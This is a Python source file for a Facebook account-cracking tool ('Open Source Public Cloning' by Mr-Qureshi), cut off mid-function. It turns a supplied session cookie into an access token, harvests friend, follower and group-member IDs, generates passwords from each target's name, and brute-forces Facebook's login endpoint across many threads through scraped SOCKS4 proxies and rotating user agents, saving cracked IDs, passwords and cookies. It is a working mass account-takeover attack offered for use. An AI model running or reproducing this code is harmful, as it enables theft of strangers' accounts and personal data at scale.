#Open Source Public Cloniing  
 #By Mr-Qureshi 
 #-----------------[ IMPORT-MODULE ]------------------- 
 import requests,bs4,json,os,sys,random,datetime,time,re 
 import urllib3,rich,base64 
 from rich.table import Table as me 
 from rich.console import Console as sol 
 from bs4 import BeautifulSoup as sop 
 from concurrent.futures import ThreadPoolExecutor as tred 
 from rich.console import Group as gp 
 from rich.panel import Panel as nel 
 from rich import print as cetak 
 from rich.markdown import Markdown as mark 
 from rich.columns import Columns as col 
 from rich import print as rprint 
 from rich import pretty 
 from rich.text import Text as tekz 
 pretty.install() 
 CON=sol() 
 #------------------[ USER-AGENT ]-------------------# 
 ugen2=[] 
 ugen=[] 
 cokbrut=[] 
 ses=requests.Session() 
 princp=[] 
 try: 
         prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text 
         open('.prox.txt','w').write(prox) 
 except Exception as e: 
 #Chnge Name  
         print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mMR-QURESHI-XD]') 
 prox=open('.prox.txt','r').read().splitlines() 
 for xd in range(10000): 
         a='Mozilla/5.0 (Symbian/3; Series60/' 
         b=random.randrange(1, 9) 
         c=random.randrange(1, 9) 
         d='Nokia' 
         e=random.randrange(100, 9999) 
         f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/' 
         g=random.randrange(1, 9) 
         h=random.randrange(1, 4) 
         i=random.randrange(1, 4) 
         j=random.randrange(1, 4) 
         k='Mobile Safari/535.1' 
         uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}') 
         ugen2.append(uaku) 
  
  
         aa='Mozilla/5.0 (Linux; U; Android' 
         b=random.choice(['6','7','8','9','10','11','12']) 
         c=' en-us; GT-' 
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         e=random.randrange(1, 999) 
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' 
         h=random.randrange(73,100) 
         i='0' 
         j=random.randrange(4200,4900) 
         k=random.randrange(40,150) 
         l='Mobile Safari/537.36' 
         uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}' 
         ugen.append(uaku2) 
 for x in range(10): 
         a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S' 
         b=random.randrange(100, 9999) 
         c=random.randrange(100, 9999) 
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         h=random.randrange(1, 9) 
         i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/' 
         j=random.randrange(1, 9) 
         k=random.randrange(1, 9) 
         l='Mobile WVGA SMM-MMS/1.2.0 OPN-B' 
         uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}' 
 def uaku(): 
         try: 
                 ua=open('bbnew.txt','r').read().splitlines() 
                 for ub in ua: 
                         ugen.append(ub) 
         except: 
                 a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text 
                 ua=open('.bbnew.txt','w') 
                 aa=re.findall('line">(.*?)<',str(a)) 
                 for un in aa: 
                         ua.write(un+'\n') 
                 ua=open('.bbnew.txt','r').read().splitlines() 
 #------------[ INDICATION ]---------------# 
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[] 
 cokbrut=[] 
 pwpluss,pwnya=[],[] 
 #------------[ WARNA-COLOR ]--------------# 
 P = '\x1b[1;97m' 
 M = '\x1b[1;91m' 
 H = '\x1b[1;92m' 
 K = '\x1b[1;93m' 
 B = '\x1b[1;94m' 
 U = '\x1b[1;95m'  
 O = '\x1b[1;96m' 
 N = '\x1b[0m'     
 Z = "\033[1;30m" 
 sir = '\033[41m\x1b[1;97m' 
 x = '\33[m' # DEFAULT 
 m = '\x1b[1;91m' #RED + 
 k = '\033[93m' # KUNING + 
 h = '\x1b[1;92m' # HIJAU + 
 hh = '\033[32m' # HIJAU - 
 u = '\033[95m' # UNGU 
 kk = '\033[33m' # KUNING - 
 b = '\33[1;96m' # BIRU - 
 p = '\x1b[0;34m' # BIRU + 
 asu = random.choice([m,k,h,u,b]) 
 #--------------------[ CONVERTER-BULAN ]--------------# 
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'} 
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'} 
 tgl = datetime.datetime.now().day 
 bln = dic[(str(datetime.datetime.now().month))] 
 thn = datetime.datetime.now().year 
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
 #------------------[ MACHINE-SUPPORT ]---------------# 
 def alvino_xy(u): 
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005) 
 def clear(): 
         os.system('clear') 
 def back(): 
         login() 
 #------------------[ LOGO ]-----------------# 
 #Logo Add Krlo Nichy Apna 
 def banner(): 
         clear() 
         sol() 
         ban=''' © MASTER MIND JOKER MAFI'A 
    ____                       __    _  
   / __ \__  __________  _____/ /_  (_) 
  / / / / / / / ___/ _ \/ ___/ __ \/ / [•] Mr Qureshi xd 
 / /_/ / /_/ / /  /  __(__  ) / / / / [•] Facebook: MrQureshi-xd 
 \___\_\__,_/_/   \___/____/_/ /_/_/ [•] Master Mind🥺❤️                                      ''' 
         cetak(nel(ban, style='white')) 
 #--------------------[ BAGIAN-MASUK ]--------------# 
 def login(): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
                 tokenku.append(token) 
                 try: 
                         sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok}) 
                         sy2 = json.loads(sy.text)['name'] 
                         sy3 = json.loads(sy.text)['id'] 
                         menu(sy2,sy3) 
                 except KeyError: 
                         login_lagi334() 
                 except requests.exceptions.ConnectionError: 
                         li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN' 
                         lo = mark(li, style='red') 
                         sol().print(lo, style='purple') 
                         exit() 
         except IOError: 
                 login_lagi334() 
 def login_lagi334(): 
         try: 
                 os.system('clear') 
                 banner() 
                 cetak(nel('\t             WELLCOME : [green]ENJOY PUBLIC TOOL[purple] ')) 
                 asu = random.choice([m,k,h,b,u]) 
                 cookie=input(f'  [{h}•{u}] INPUT COOKIES :{asu} ') 
                 data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})  
                 find_token = re.search("(EAAG\w+)", data.text) 
                 ken=open(".token.txt", "w").write(find_token.group(1)) 
                 cok=open(".cok.txt", "w").write(cookie) 
                 print(f'  {u}[{h}•{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1) 
                 exit() 
         except Exception as e: 
                 os.system("rm -f .token.txt") 
                 os.system("rm -f .cok.txt") 
                 print(f'  %s[%sx%s]%s LOGIN ERROR....TRY AGAIN !!%s'%(x,k,x,m,x)) 
                 exit() 
 #------------------[ BAGIAN-MENU ]----------------# 
 def menu(my_name,my_id): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
         except IOError: 
                 print('[×] Cookies Error  ') 
                 time.sleep(5) 
                 login_lagi334() 
         os.system('clear') 
         banner() 
         ip = requests.get("https://api.ipify.org").text 
         cetak(nel('\tWELCOM [green]%s[purple] LOGIN USER'%(my_name))) 
         alvino_xy(f'{u}ID  : '+str(my_id)) 
         alvino_xy(f'{h}IP  : {ip}') 
         cetak(nel('\t[bold cyan]           • CHOOSE CLONING MENU • [/bold cyan]')) 
         print('') 
         cetak(nel('[bold green] ❤️1. CRACK PUBLIK ID\n  ❤️2. CHEK RESULTS\n ❤️0. EXIT [bold green]'))  
         _____cowok__pink_____ = input('\n CHOOSE : ') 
         if _____cowok__pink_____ in ['1']: 
                 dump_massal() 
         elif _____cowok__pink_____ in ['2']: 
                 result() 
         elif _____cowok__pink_____ in ['3']: 
                 dump_massal() 
         elif _____cowok__pink_____ in ['4']: 
                 crack_file() 
         elif _____cowok__pink_____ in ['5']: 
                 result() 
         elif _____cowok__pink_____ in ['0']: 
                 os.system('rm -rf .token.txt') 
                 os.system('rm -rf .cookie.txt') 
                 print('=>DONE LOGUT ') 
                 exit() 
         else: 
                 print('=>CHOOSE RIGHT MNEU ') 
                 back() 
 def error(): 
         print(f'{k}=>TRY AGAIN {u}') 
         time.sleep(4) 
         back() 
 #-----------------[ HASIL-CRACK ]-----------------# 
 def result(): 
         print('=>Ok IDZ ') 
         print('=>CP IDZ ') 
         print('=>EXIT        ') 
         kz = input('\n=>CHOOSE : ') 
         if kz in ['1','01']: 
                 try:vin = os.listdir('CP') 
                 except FileNotFoundError: 
                         print('=>File Tidak Di Temukan ') 
                         time.sleep(3) 
                         back() 
                 if len(vin)==0: 
                         print('=>Anda Tidak Memiliki Hasil CP ') 
                         time.sleep(2) 
                         back() 
                 else: 
                         cih = 0 
                         lol = {} 
                         for isi in vin: 
                                 try:hem = open('CP/'+isi,'r').readlines() 
                                 except:continue 
                                 cih+=1 
                                 if cih<10: 
                                         nom = '0'+str(cih) 
                                         lol.update({str(cih):str(isi)}) 
                                         lol.update({nom:str(isi)}) 
                                         print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                                 else: 
                                         lol.update({str(cih):str(isi)}) 
                                         print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                         geeh = input('\n=>CHOSE : ') 
                         try:geh = lol[geeh] 
                         except KeyError: 
                                 print('=>Pilih Yang Bener Kontol ') 
                                 exit() 
                         try:lin = open('CP/'+geh,'r').read().splitlines() 
                         except: 
                                 print('=>File Tidak Di Temukan ') 
                                 time.sleep(2) 
                                 back() 
                         nocp=0 
                         for cpku in range(len(lin)): 
                                 cpkuni=lin[nocp].split('|') 
                                 cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}' 
                                 sol().print(mark(cpkuh,style="yellow")) 
                                 nocp +=1 
                         input('[ Klik Enter ]') 
                         back() 
         elif kz in ['2','02']: 
                 try:vin = os.listdir('OK') 
                 except FileNotFoundError: 
                         print('=>File Tidak Di Temukan ') 
                         time.sleep(2) 
                         back() 
                 if len(vin)==0: 
                         print('=>Anda Tidak Mempunyai File OK ') 
                         time.sleep(2) 
                         back() 
                 else: 
                         cih = 0 
                         lol = {} 
                         for isi in vin: 
                                 try:hem = open('OK/'+isi,'r').readlines() 
                                 except:continue 
                                 cih+=1 
                                 if cih<100: 
                                         nom = '0'+str(cih) 
                                         lol.update({str(cih):str(isi)}) 
                                         lol.update({nom:str(isi)}) 
                                         print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                                 else: 
                                         lol.update({str(cih):str(isi)}) 
                                         print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                         geeh = input('\n=>Pilih : ') 
                         try:geh = lol[geeh] 
                         except KeyError: 
                                 print('=>Pilih Yang Bener TOLOL ') 
                                 exit() 
                         try:lin = open('OK/'+geh,'r').read().splitlines() 
                         except: 
                                 print('=>File Tidak Di Temukan ') 
                                 time.sleep(2) 
                                 back() 
                         nocp=0 
                         for cpku in range(len(lin)): 
                                 cpkuni=lin[nocp].split('|') 
                                 cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}' 
                                 sol().print(mark(cpkuh,style="green")) 
                                 print(f'{hh}COOKIE : {u}{cpkuni[2]}') 
                                 nocp +=1 
                         input('[ Klik Enter ]') 
                         back() 
         elif kz in ['0','00']: 
                 back() 
         else: 
                 print('=>Pilih Yang Bener TOLOL ') 
                 exit() 
 #-------------------[ CRACK-PUBLIK ]----------------# 
 def dump_massal(): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
         except IOError: 
                 exit() 
         try: 
                 jum = int(input('=>ENTER LIMT IDZ : ')) 
         except ValueError: 
                 print('{k}=>NOT JANI ') 
                 exit() 
         if jum<1 or jum>100000000: 
                 print('=>TRY AGAIN ') 
                 exit() 
         ses=requests.Session() 
         yz = 0 
         for met in range(jum): 
                 yz+=1 
                 kl = input('=>iD LNK '+str(yz)+' : ') 
                 uid.append(kl) 
         for userr in uid: 
                 try: 
                         col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json() 
                         for mi in col['friends']['data']: 
                                 try: 
                                         iso = (mi['id']+'|'+mi['name']) 
                                         if iso in id:pass 
                                         else:id.append(iso) 
                                 except:continue 
                 except (KeyError,IOError): 
                         pass 
                 except requests.exceptions.ConnectionError: 
                         print('{k}=>TRY AGAIN ') 
                         exit() 
         try: 
                 print('') 
                 print(f'{k}=>TOTAL ID★{b}'+str(len(id))) 
                 setting() 
         except requests.exceptions.ConnectionError: 
                 print(f'{u}') 
                 print('=>Sinyal Lo kek Kontol ') 
                 back() 
         except (KeyError,IOError): 
                 print(f'➥=>{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWSE CHEK YOUR ID LNK {u}') 
                 time.sleep(3) 
                 back() 
 #-------------------[ CRACK-PENGIKUT ]----------------# 
 def dump_pengikut(): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
         except IOError: 
                 exit() 
         print('=>TYPE ME IF YOU WNT DUMP TOKEN ID FRIENDS ') 
         pil = input('➥➣ENTER ID LNK : ') 
         try: 
                 koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json() 
                 for pi in koh2['subscribers']['data']: 
                         try:id.append(pi['id']+'|'+pi['name']) 
                         except:continue 
                 print(f'=>Total Idz :{h} '+str(len(id))) 
                 setting() 
         except requests.exceptions.ConnectionError: 
                 print('=>CHEK INTRNT ') 
                 exit() 
         except (KeyError,IOError): 
                 print('=>ERORR ') 
                 exit() 
 #------------------[ CRACK-GRUP ]-----------------# 
 balmond = b+"["+h+"✓"+b+"]" 
  
 def lah(): 
         print("\r"+balmond+m+" \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m "+str(len(id))+"                     ") 
         input(balmond+m +"\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m Jika Ingin Langsung Crack !!") 
         pass 
         setting() 
 def grup(): 
         print('') 
         id = input(""+balmond+h+" \x1b[1;94m>> ENTER GRUP LINK :\x1b[1;94m ") 
         ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba' 
         miskinlu = {"user-agent": ua} 
         url = "https://mbasic.facebook.com/groups/"+id 
         ses = requests.Session() 
         try: 
                 gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser') 
         except requests.exceptions.ConnectionError: 
                 print(balmond+m+" CHEK INTERNT..") 
                 time.sleep(0.5) 
                 exit() 
         berr = gn.find("title") 
         berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","") 
         if berr2=='Masuk Facebook': 
                 print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..") 
                 time.sleep(0.5) 
                 crack_grup() 
         elif berr2=='Kesalahan': 
                 jalan(balmond+m+" Grup Tidak Ditemukan..") 
                 time.sleep(0.5) 
                 crack_grup() 
         else:pass 
         print(""+balmond+p+" \x1b[1;94m>> Nama Grup :\x1b[1;97m "+berr2) 
         ggs = gn.find_all('table') 
         ang = [] 
         for ff in ggs: 
                 anggo = ff.text 
                 bro = anggo.replace('Anggota','') 
                 try: 
                         mex = int(bro) 
                         jumlah = ang.append(mex) 
                 except: 
                         pass 
         if len(ang)==0: 
                 print(balmond+h+" Anggota : -") 
         else: 
                 print(balmond+h+" \x1b[1;94m>> Anggota :\x1b[1;97m "+str(ang[0])) 
         grup1(url) 
 def grup1(urls): 
         use = [] 
         ses = requests.Session() 
         print(""+balmond+m+" \x1b[1;94mJika Berhenti, Mode Pesawat 5 Detik") 
         print(balmond+m+" \x1b[1;94mSedang Mengumpulkan ID") 
         print(balmond+m+" \x1b[1;94mTekan CTRL + C Untuk Stop") 
         while True: 
                 try: 
                         ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba' 
                         miskinlu = {"user-agent": ua} 
                         try: 
                                 url = use[0] 
                         except: 
                                 url = urls 
                         set = parser(ses.get(url, headers=miskinlu).text, "html.parser") 
                         bf2 = set.find_all('a') 
                         for g in bf2: 
                                 css = str(g).split('>') 
                                 if 'Lihat Postingan Lainnya</span' in css: 
                                         bcj = str(g).replace('<a href="','').replace('amp;','') 
                                         bcj2 = bcj.split(' ')[0].replace('"><img','') 
                         tes = set.find_all('table') 
                         for cari in tes: 
                                 liatnih = cari.text 
                                 spl = liatnih.split(' ') 
                                 if 'mengajukan' in spl: 
                                         idsiapa = re.findall('content_owner_id_new.\w+',str(cari)) 
                                         idyou =        idsiapa[0].replace('content_owner_id_new.','') 
                                         namayou = liatnih.replace(' mengajukan pertanyaan .','') 
                                         idku = idyou+'|'+namayou 
                                         if idku in id: 
                                                 continue 
                                         else: 
                                                 id.append(idku) 
                                                 print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush() 
                                 elif '>' in spl: 
                                         idsiapa = re.findall('content_owner_id_new.\w+',str(cari)) 
                                         idyou =        idsiapa[0].replace('content_owner_id_new.','') 
                                         namayou = liatnih.split(' > ')[0] 
                                         idku = idyou+'|'+namayou 
                                         if idku in id: 
                                                 continue 
                                         else: 
                                                 id.append(idku) 
                                                 print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush() 
                                 else: 
                                         continue 
                         try: 
                                 link_ = bcj2 
                                 use.insert(0,'https://mbasic.facebook.com'+link_) 
                         except: 
                                 girang = set.find('title') 
                                 girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","") 
                                 if girang2=='Masuk Facebook': 
                                         pass 
                                 else: 
                                         lah() 
                 except requests.exceptions.ConnectionError: 
                         try: 
                                 time.sleep(31) 
                         except KeyboardInterrupt: 
                                 lah() 
                 except KeyboardInterrupt: 
                         lah() 
 #-------------[ CRACK-FROM-FILE ]------------------# 
 def crack_file(): 
         try:vin = os.listdir('DUMP') 
         except FileNotFoundError: 
                 print('=>File Tidak Ditemukan ') 
                 time.sleep(2) 
                 back() 
         if len(vin)==0: 
                 print('=>Kamu Tidak Memiliki File Dump ') 
                 time.sleep(2) 
                 back() 
         else: 
                 cih = 0 
                 lol = {} 
                 for isi in vin: 
                         try:hem = open('DUMP/'+isi,'r').readlines() 
                         except:continue 
                         cih+=1 
                         if cih<100: 
                                 nom = ''+str(cih) 
                                 lol.update({str(cih):str(isi)}) 
                                 lol.update({nom:str(isi)}) 
                                 print(f'=>%s. %s ({h} %s{u} idz )'%(nom,isi,len(hem))) 
                         else: 
                                 lol.update({str(cih):str(isi)}) 
                                 print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                                 print('=>%s. %s ({h} %s {u}idz) '%(cih,isi,len(hem))) 
                 geeh = input('\n=>Pilih : ') 
                 try:geh = lol[geeh] 
                 except KeyError: 
                         print(f'{k}=>Pilih Yang Bener Kontol {u}') 
                         time.sleep(3) 
                         back() 
                 try:lin = open('DUMP/'+geh,'r').read().splitlines() 
                 except: 
                         print('=>File Tidak Ditemukan, Coba Lagi Nanti ') 
                         time.sleep(2) 
                         back() 
                 for xid in lin: 
                         id.append(xid) 
                 setting() 
 #-------------[ Id -Crackiing]---------------# 
 def setting(): 
         cetak(nel('\t[bold cyan]         CLONING MENU • [/bold cyan]')) 
         print('')  
         cetak(nel('[bold yellow]❤️➣1. CLONE JUST OLD IDZ \n❤️➣2. CLONE JUST NEW IDZ(RECOMEND)\n❤️➣3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]')) 
         print('') 
         hu = input('=>CHOOSE : ') 
         if hu in ['1','01']: 
                 for tua in sorted(id): 
                         id2.append(tua) 
  
         elif hu in ['2','02']: 
                 muda=[] 
                 for bacot in sorted(id): 
                         muda.append(bacot) 
                 bcm=len(muda) 
                 bcmi=(bcm-1) 
                 for xmud in range(bcm): 
                         id2.append(muda[bcmi]) 
                         bcmi -=1 
         elif hu in ['3','03']: 
                 for bacot in id: 
                         xx = random.randint(0,len(id2)) 
                         id2.insert(xx,bacot) 
         else: 
                 print('=>TRY AGAIN') 
                 exit() 
         cetak(nel('\t[bold cyan]             • METHODE LOGIN • [/bold cyan]')) 
         print('')  
         cetak(nel('[bold purple]❤️➣1. MOBILE\n❤️➣2. MBASIC\n❤️➣3. TOUCH\n❤️➣4. MTOUCH [bold purple]'))  
         print('') 
         hc = input('>> CHOOSE : ') 
         if hc in ['1','01']: 
                 method.append('mobile') 
         elif hc in ['2','02']: 
                 method.append('mobile') 
         elif hc in ['3','03']: 
                 method.append('mobile') 
         elif hc in ['4','04']: 
                 method.append('mbasic') 
         else: 
                 method.append('mobile') 
         print(f'{m}NOTE :\n🙄{k}USE DEFULT PASS MENU ')  
         print('') 
         _jembot_ = input('=>SHOW APKS ( Y/t ) ') 
 #        if _jembot_ in ['']: 
 #                print('=>Pilih Yang Bener Kontol ') 
 #                back() 
 #   elif _jembot_ in ['y','Y']: 
                 #taplikasi.append('ya') 
         #else: 
                 #taplikasi.append('no') 
         pwplus=input('=>PASWORD MENU MENUAL(CHOISE)/DEFULT(AUTO)( m/d ) ') 
         if pwplus in ['y','Y']: 
                 pwpluss.append('ya') 
                 cetak(nel('[[purple]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]•[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] ')) 
                 pwku=input('#=>Add PASSWORDS : ') 
                 pwkuh=pwku.split(',') 
                 for xpw in pwkuh: 
                         pwnya.append(xpw) 
         else: 
                 pwpluss.append('no') 
         passwrd() 
         exit()  
 #-------------------[ BAGIAN-WORDLIST ]------------# 
 def passwrd(): 
         cetak(nel('[bold cyan]               WAIT FOR A WHILE 😂[bold cyan]'))  
         print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}') 
         print('') 
         print(f'=>RESULTS {h}OK{u} CHEK : {h}OK/%s {b}'%(okc)) 
         print(f'=>RESULTS {k}CP{h} CHEK : {k}CP/%s {b}'%(cpc)) 
         print(f'=>TURN AIRPLANE MODE AFTER CLONE IDZ ABOVE {h}1K{u} Idz\n') 
         with tred(max_workers=30) as pool: 
                 for yuzong in id2: 
                         idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower() 
                         frs = nmf.split(' ')[0] 
                         pwv = [] 
                         if len(nmf)<6: 
                                 if len(frs)<3: 
                                         pass 
                                 else: 
                                         pwv.append(frs+'123') 
                                         pwv.append(frs+'1234') 
                                         pwv.append(frs+'12345') 
                                         pwv.append(frs+'123456') 
                                         pwv.append(frs+'2020') 
                                         pwv.append(frs+'2021') 
                                         pwv.append(frs+'2022') 
                         else: 
                                 if len(frs)<3: 
                                         pwv.append(nmf) 
                                 else: 
                                         pwv.append(nmf) 
                                         pwv.append(frs+'123') 
                                         pwv.append(frs+'1234') 
                                         pwv.append(frs+'12345') 
                                         pwv.append(frs+'123456') 
                                         pwv.append(frs+'2020') 
                                         pwv.append(frs+'2021') 
                                         pwv.append(frs+'2022') 
                         if 'ya' in pwpluss: 
                                 for xpwd in pwnya: 
                                         pwv.append(xpwd) 
                         else:pass 
                         if 'mobile' in method: 
                                 pool.submit(crack,idf,pwv) 
                         elif 'free' in method: 
                                 pool.submit(crack,idf,pwv) 
                         elif 'touch' in method: 
                                 pool.submit(crack,idf,pwv) 
                         elif 'mbasic' in method: 
                                 pool.submit(crack,idf,pwv) 
                         else: 
                                 pool.submit(crack,idf,pwv) 
         print('') 
         cetak(nel('\t[purple]=>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] ')) 
         print(f'[{h}•{u}]{h} OK : {h}%s '%(ok)) 
         print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp)) 
         print('') 
         print('{k}=>Lanjut Crack Kembali ( Y/t ) ? ') 
         woi = input('=>Pilih : ') 
         if woi in ['y','Y']: 
                 back() 
         else: 
                 print(f'\t{x}=>{k} Good Bye Dadaahh{u} ') 
                 time.sleep(2) 
                 exit() 
 #--------------------[ METODE-B-API ]-----------------# 
 def crack(idf,pwv): 
         global loop,ok,cp 
         bo = random.choice([m,k,h,b,u,x]) 
         sys.stdout.write(f"\r{b}WASI-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "), 
         sys.stdout.flush() 
         ua = random.choice(ugen) 
         ua2 = random.choice(ugen2) 
         ses = requests.Session() 
         for pw in pwv: 
                 try: 
                         nip=random.choice(prox) 
                         proxs= {'http': 'socks4://'+nip} 
                         ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}) 
                         p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr') 
                         dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,} 
                         koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]) 
                         koki+=' m_pixel_ratio=2.625; wd=412x756' 
                         heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"} 
                         po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs) 
                         if "checkpoint" in po.cookies.get_dict().keys(): 
                                 cetak(nel('  [red]     ✨ WASI-CHECKPOINT ✨ [red]')) 
